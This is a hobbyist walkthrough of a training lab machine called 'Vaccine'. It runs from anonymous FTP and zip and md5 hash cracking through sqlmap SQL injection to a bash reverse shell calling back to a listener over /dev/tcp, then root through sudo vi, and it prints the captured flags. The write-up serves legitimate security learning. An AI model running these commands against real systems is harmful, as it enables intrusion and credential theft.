

# Starting Point / Vaccine

**About:** Vaccine is a very easy Linux machine that emphasizes enumeration and password cracking. Anonymous FTP access exposes a password-protected backup archive which can be cracked to recover web application credentials. These credentials grant access to a PHP application vulnerable to SQL injection which leads to command execution and an initial shell as the postgres user. Finally, privilege escalation can be achieved by abusing misconfigured sudo permissions on vi.

**Target:** `10.129.23.203`

---

## Task 1 - Besides SSH and HTTP, what other service is hosted on this box?

First run nmap with `-sV` for versioning and `-p-` for all ports (also `-T5` to speed this up):

```bash
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

**Answer:** `ftp`

---

## Task 2 - This service can be configured to allow login with any password for specific username. What is that username?

Could it be anon?

```bash
─$ ftp 10.129.23.203
Connected to 10.129.23.203.
220 (vsFTPd 3.0.3)
Name (10.129.23.203:nomad): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

It was lol. Cybsec101

**Answer:** `anonymous`

---

## Task 3 - What is the name of the file downloaded over this service?

Now we just list the files, and download?:

```bash
ftp> ls
229 Entering Extended Passive Mode (|||10056|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
```
(We can download with `get`)

**Answer:** `backup.zip`

---

## Task 4 - What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

It's called `zip2john` and can be useful to crack open password protected zips:

```bash
zip2john backup.zip > hash
```

```bash
backup.zip:$pkzip$2*1*1*0*8*24*5722*543fb39ed1a919ce7b58641a238e00f4cb3a826cfb1b8f4b225aa15c4ffda8fe72f60a82*2*0*3da*cca*1b1ccd6a*504*43*8*3da*989a*22290dc3505e51d341f31925a7ffefc181ef9f66d8d25e53c82afc7c1598fbc3fff28a17ba9d8cec9a52d66a11ac103f257e14885793fe01e26238915796640e8936073177d3e6e28915f5abf20fb2fb2354cf3b7744be3e7a0a9a798bd40b63dc00c2ceaef81beb5d3c2b94e588c58725a07fe4ef86c990872b652b3dae89b2fff1f127142c95a5c3452b997e3312db40aee19b120b85b90f8a8828a13dd114f3401142d4bb6b4e369e308cc81c26912c3d673dc23a15920764f108ed151ebc3648932f1e8befd9554b9c904f6e6f19cbded8e1cac4e48a5be2b250ddfe42f7261444fbed8f86d207578c61c45fb2f48d7984ef7dcf88ed3885aaa12b943be3682b7df461842e3566700298efad66607052bd59c0e861a7672356729e81dc326ef431c4f3a3cdaf784c15fa7eea73adf02d9272e5c35a5d934b859133082a9f0e74d31243e81b72b45ef3074c0b2a676f409ad5aad7efb32971e68adbbb4d34ed681ad638947f35f43bb33217f71cbb0ec9f876ea75c299800bd36ec81017a4938c86fc7dbe2d412ccf032a3dc98f53e22e066defeb32f00a6f91ce9119da438a327d0e6b990eec23ea820fa24d3ed2dc2a7a56e4b21f8599cc75d00a42f02c653f9168249747832500bfd5828eae19a68b84da170d2a55abeb8430d0d77e6469b89da8e0d49bb24dbfc88f27258be9cf0f7fd531a0e980b6defe1f725e55538128fe52d296b3119b7e4149da3716abac1acd841afcbf79474911196d8596f79862dea26f555c772bbd1d0601814cb0e5939ce6e4452182d23167a287c5a18464581baab1d5f7d5d58d8087b7d0ca8647481e2d4cb6bc2e63aa9bc8c5d4dfc51f9cd2a1ee12a6a44a6e64ac208365180c1fa02bf4f627d5ca5c817cc101ce689afe130e1e6682123635a6e524e2833335f3a44704de5300b8d196df50660bb4dbb7b5cb082ce78d79b4b38e8e738e26798d10502281bfed1a9bb6426bfc47ef62841079d41dbe4fd356f53afc211b04af58fe3978f0cf4b96a7a6fc7ded6e2fba800227b186ee598dbf0c14cbfa557056ca836d69e28262a060a201d005b3f2ce736caed814591e4ccde4e2ab6bdbd647b08e543b4b2a5b23bc17488464b2d0359602a45cc26e30cf166720c43d6b5a1fddcfd380a9c7240ea888638e12a4533cfee2c7040a2f293a888d6dcc0d77bf0a2270f765e5ad8bfcbb7e68762359e335dfd2a9563f1d1d9327eb39e68690a8740fc9748483ba64f1d923edfc2754fc020bbfae77d06e8c94fba2a02612c0787b60f0ee78d21a6305fb97ad04bb562db282c223667af8ad907466b88e7052072d6968acb7258fb8846da057b1448a2a9699ac0e5592e369fd6e87d677a1fe91c0d0155fd237bfd2dc49*$/pkzip$::backup.zip:style.css, index.php:backup.zip
```

**Answer:** `zip2john`


---

## Task 5 - What is the password for the admin user on the website?

**Step 1:** Crack the zip password:

I accidentally ran _just_ `john hash` without a wordlist and it cracked the zip file hash in like -2 seconds:

```bash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
741852963        (backup.zip)     
1g 0:00:00:00 DONE 2/3 (2026-05-29 22:41) 4.347g/s 334021p/s 334021c/s 334021C/s 123456..ferrises
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

**Step 2:** Unzip the zip and review:

```bash
unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 741852963
  inflating: index.php               
  inflating: style.css     
```

Just examined the files and noticed the super bad authentication in the index.php file:

```bash
head index.php 
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>   
```

**Step 3:** Crack the admin hash (md5 `2cb42f8734ea607eefed3b70af13bbd3`):

I'm sure i could've just ran `john` again, but this time i went to `https://crackstation.net/` and it was already cracked:

**Answer:** `qwerty789`

---

## Task 6 - What option can be passed to sqlmap to try to get command execution via the sql injection?

Tbh, just used the `sqlmap --help` cmd/flag to grab this answer:

```bash
  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
```

**Answer:** `--os-shell`

---

## Task 7 - What program can the postgres user run as root using sudo?

First we need to get into the database:
- I already determined that I can log in, which takes us to a "car search" database

**Step 1:** Login and grab our cookie:

```bash
curl -c cookies.txt -d "username=admin&password=qwerty789" http://10.129.23.203/index.php
```

```bash
# Netscape HTTP Cookie File
# https://curl.se/docs/http-cookies.html
# This file was generated by libcurl! Edit at your own risk.

10.129.23.203	FALSE	/	FALSE	0	PHPSESSID	dm5ra4vacm6gfcau360clv8sab
```

**Step 2:** Pass the cookie into `sqlmap` and scan the database:

```bash
sqlmap -u 'http://10.129.23.203/dashboard.php?search=alpha' --load-cookies=cookies.txt --level=5 --risk=3 --batch

[23:23:07] [INFO] testing PostgreSQL
[23:23:08] [INFO] confirming PostgreSQL
[23:23:08] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 20.04 or 19.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
Parameter: search (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: search=alpha' AND 7618=7618-- dXZi
current database (equivalent to schema on PostgreSQL): 'public'
Database: public
[1 table]
+------+
| cars |
+------+
```
This command allow me to get a shell open:

```bash
sqlmap -u 'http://10.129.23.203/dashboard.php?search=alpha' --load-cookies=cookies.txt --batch --os-shell --technique=S
os-shell>
```
~~**Step 3:** Open up a reverse shell from here? (https://www.revshells.com/):~~

~~- _correction_, i was unable to successfully execute commands from the os-shell>, so i am pivoting:~~

~~**Step 3:** Push a new `shell.php` file to the box using `sqlmap --file-write`?:~~

- Following up, it must have been a connection issue, I _am_ able to shell into the machine and execute commands, so I want to get back to the reverse shell idea because this sqlmap interact shell is atrocious over my connection

**Step 3:** Establish a listener on the local machine (https://www.revshells.com/):

```bash
bash nc -lvpn 6969` 
listening on [any] 6969 ...
```
**Step 4:** Connect back from the target machine (https://www.revshells.com/):

```bash
os-shell> bash -c "sh -i >& /dev/tcp/10.10.14.253/6969 0>&1"
```

Snagged it:

```bash
connect to [10.10.14.253] from (UNKNOWN) [10.129.23.203] 58548
sh: 0: can't access tty; job control turned off

$ whoami
postgres

$ id
uid=111(postgres) gid=117(postgres) groups=117(postgres),116(ssl-cert)

$ uname -a
Linux vaccine 5.3.0-64-generic #58-Ubuntu SMP Fri Jul 10 19:33:51 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

The postgres user's home director is `/var/lib/postgresql`, and in there is the user.txt flag I'm assuming:

```
$ cat /etc/passwd | grep postgres
postgres:x:111:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash

$ ls /var/lib/postgresql/
11
user.txt

$ cat /var/lib/postgresql/user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```

Because we know its running Apache, I'll look at the /var/www directory:

```bash
$ ls /var/www/
html

$ ls /var/www/html
bg.png
dashboard.css
dashboard.js
dashboard.php
index.php
license.txt
style.css
```

I looked through these and found the database connection code in `dashboard.php`:

```bash
$ grep -Rin pg_connect /var/www/html -C 5

/var/www/html/dashboard.php-36-	if($_SESSION['login'] !== "true") {
/var/www/html/dashboard.php-37-	  header("Location: index.php");
/var/www/html/dashboard.php-38-	  die();
/var/www/html/dashboard.php-39-	}
/var/www/html/dashboard.php-40-	try {
/var/www/html/dashboard.php:41:	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
/var/www/html/dashboard.php-42-	}
/var/www/html/dashboard.php-43-
/var/www/html/dashboard.php-44-	catch ( exception $e ) {
/var/www/html/dashboard.php-45-	  echo $e->getMessage();
/var/www/html/dashboard.php-46-	}
```

User: postgres
Password: P@s5w0rd!

We can now use `sudo -l` to view the sudo commands the postgres user can run, assuming this is the same password:

```bash
$ sudo -l -S
[sudo] password for postgres: P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

The postgres user can run `/bin/vi /etc/postgresql/11/main/pg_hba.conf` as root

**Answer:** `vi`

---

## Task 8 - Submit the flag located in the postgres user's home directory.

From the previous task I'll just insert the flag found:

```
$ cat /var/lib/postgresql/user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
```
**Answer:** `ec9b13ca4d6229cd5cc1e09980965bf7`

---

## Task 9 - Submit the flag located in root's home directory.


Privesc time:

~~Since we postgres can run `vi` as root, can we just add postgres to the sudousers file/overwrite it?~~
- Wrong thought process, since `sudo vi` is specific to the `/etc/postgresql/11/main/pg_hba.conf` file

Vi vulnerabilities?
- `It's a feature, not a bug`: Found this article (https://medium.com/@pettyhacks/linux-privilege-escalation-via-vi-36c00fcd4f5e) and sure enough we can open a root shell from `vi` itself:

```bash
$ sudo vi /etc/postgresql/11/main/pg_hba.conf

Vim: Warning: Output is not to a terminal
Vim: Warning: Input is not from a terminal

E558: Terminal entry not found in terminfo
'unknown' not known. Available builtin terminals are:
    builtin_amiga
    builtin_beos-ansi
    builtin_ansi
    builtin_pcansi
    builtin_win32
    builtin_vt320
    builtin_vt52
    builtin_xterm
    builtin_iris-ansi
    builtin_debug
    builtin_dumb
defaulting to 'ansi'
```

---

```bash
# PostgreSQL Client Authentication Configuration File
# ===================================================
#
# Refer to the "Client Authentication" section in the PostgreSQL
# documentation for a complete description of this file.  A short
# synopsis follows.
#
# This file controls: which hosts are allowed to connect, how clients
# are authenticated, which PostgreSQL user names they can use, which
# databases they can access.  Records take one of these forms:
#
# local      DATABASE  USER  METHOD  [OPTIONS]
# host       DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostssl    DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostnossl  DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
#
# (The uppercase items must be replaced by actual values.)
#
# The first field is the connection type: "local" is a Unix-domain
# socket, "host" is either a plain or SSL-encrypted TCP/IP socket,
# "hostssl" is an SSL-encrypted TCP/IP socket, and "hostnossl" is a
# plain TCP/IP socket.
#
"/etc/postgresql/11/main/pg_hba.conf" 99L, 4659C              1,1           Top
```

From the article, we can run system commands in `vi`, so i can just enter `:!/bin/bash` and sho nuff a root shell pops:

```bash
:!/bin/bashL Client Authentication Configuration File
# ===================================================
#
# Refer to the "Client Authentication" section in the PostgreSQL
# documentation for a complete description of this file.  A short
# synopsis follows.
#
# This file controls: which hosts are allowed to connect, how clients
# are authenticated, which PostgreSQL user names they can use, which
# databases they can access.  Records take one of these forms:
#
# local      DATABASE  USER  METHOD  [OPTIONS]
# host       DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostssl    DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostnossl  DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
#
# (The uppercase items must be replaced by actual values.)
#
# The first field is the connection type: "local" is a Unix-domain
# socket, "host" is either a plain or SSL-encrypted TCP/IP socket,
# "hostssl" is an SSL-encrypted TCP/IP socket, and "hostnossl" is a
# plain TCP/IP socket.
#
:!/bin/bash
whoami
root

ls /root
pg_hba.conf
root.txt
snap

cat /root/root.txt
dd6e058e814260bc70e9bbdef2715849
```

**Answer:** `dd6e058e814260bc70e9bbdef2715849`
